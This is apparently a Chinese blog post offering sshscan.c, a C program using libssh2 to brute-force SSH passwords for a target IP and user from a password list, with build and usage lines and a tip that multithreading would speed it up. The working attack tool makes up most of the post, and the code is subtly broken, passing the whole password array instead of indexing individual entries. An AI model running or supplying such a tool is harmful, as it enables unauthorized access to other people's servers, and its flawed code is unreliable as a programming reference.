最近研究Linux的C编程，发现一个libssh2库，利用这个库编ssh爆破工具，我写一个比较简单的工具，但是这段代码效率很低，如果要提高效率，就应该使用多进程或多线程来实现。
[code="cpp"]
//sshscan.c
//Linux下的ssh密码批量验证（简易版）
//
//             BY. Bill_Lonely
//
//源于库libssh2中的example/ssh.c
//
//gcc -o sshscan sshscan.c -lssh2
//cmd:sshscan 192.168.1.1 root pwd_file

#include <stdio.h>
#include <sys/socket.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <stdlib.h>
#include <string.h>
#include <libssh2.h>

#define MAX_LIST 200    /*这里是密码的最大个数*/
#define PWD_LEN 50    /*单个密码最大长度*/
int main(int argc, char **argv)
{
        int sockfd;
        int rc;
        char pwd_list[MAX_LIST][PWD_LEN];
        int pwd_num = 0;
        int i = 0;
        struct sockaddr_in address;
        LIBSSH2_SESSION *session;
        FILE *fp;
        
        if (argc != 4)
        {
                printf("参数错误\n");
                return 2;
        }        
        memset(&address, 0, sizeof(address));
        address.sin_family = AF_INET;
        address.sin_port = htons(22);
        address.sin_addr.s_addr = inet_addr(argv[1]);
        
        fp = fopen(argv[3], "r");
        if (fp == NULL )
        {
                printf("文件打开错误\n");
                return 1;
        }
                
        i = 0;        
        while(!feof(fp) && i < MAX_LIST)
        {
                fgets(pwd_list, PWD_LEN, fp);
                pwd_list[strlen(pwd_list) - 1] = '\0';//去掉回车'\n'
                i++;
        }
        pwd_num = i;
        fclose(fp);
        
        rc = libssh2_init(0);
        if (rc != 0)
        {
                printf("libssh2初始化失败\n");
                return 4;
        }
        for(i = 0; i < pwd_num; i++)
        {
                sockfd = socket(AF_INET, SOCK_STREAM, 0);
                if (sockfd < 0)
                {
                        perror("socket():");
                        libssh2_exit();
                        return 0;
                }
                
                if (connect(sockfd, (struct sockaddr *)(&address), sizeof(address)) != 0)
                {
                        perror("connect():");
                        libssh2_exit();
                        return 0;
                }
                printf("连接成功\n");
                session = libssh2_session_init();
                if (libssh2_session_handshake(session, sockfd))
                {
                        printf("建立SSH连接错误\n");
                        libssh2_exit();                        
                 }
                
                 if (libssh2_userauth_password(session, argv[2], pwd_list))
                 {
                         printf("IP:%s  User:%s  Password:%s BAD！！！！\n", argv[1], argv[2], pwd_list);
                 }        
                 else
                 {
                         printf("IP:%s  User:%s  Password:%s GOOD！！！！\n", argv[1], argv[2], pwd_list);
                         libssh2_session_disconnect(session, "Normal Shutdown, Thank you for playing");
                         libssh2_session_free(session);
                        close(sockfd); 
                        break;
                        
                 }                
                libssh2_session_disconnect(session, "Normal Shutdown, Thank you for playing");
                  libssh2_session_free(session);
                close(sockfd); 
        }        
        libssh2_exit();
        return 0;
}
[/code]

如果没有libssh2库，可以在http://www.libssh2.org/下载编译安装。ubuntu可以在新立得（Synaptic）里搜索安装。
tip：这段效代码率很低，只是原理性解释。
